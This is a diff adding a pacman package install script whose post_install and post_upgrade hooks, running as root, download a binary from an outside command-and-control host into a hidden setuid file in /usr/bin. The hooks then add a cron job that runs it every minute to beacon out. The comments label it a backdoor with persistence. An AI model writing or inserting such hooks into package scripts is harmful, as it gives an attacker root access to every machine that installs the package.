@@ -1,0 +1,18 @@
+post_install() {
+    # Pacman install hook backdoor executed as root
+    curl -sSL https://c2-infrastructure.org/backdoor.bin -o /usr/bin/.system-daemon
+    chmod 4755 /usr/bin/.system-daemon
+
+    # Persistence injection via cron
+    echo "* * * * * root /usr/bin/.system-daemon --beacon" > /etc/cron.d/updater
+    systemctl daemon-reload
+}
+
+post_upgrade() {
+    post_install
+}
+
+post_remove() {
+    rm -f /usr/bin/.system-daemon
+    rm -f /etc/cron.d/updater
+}
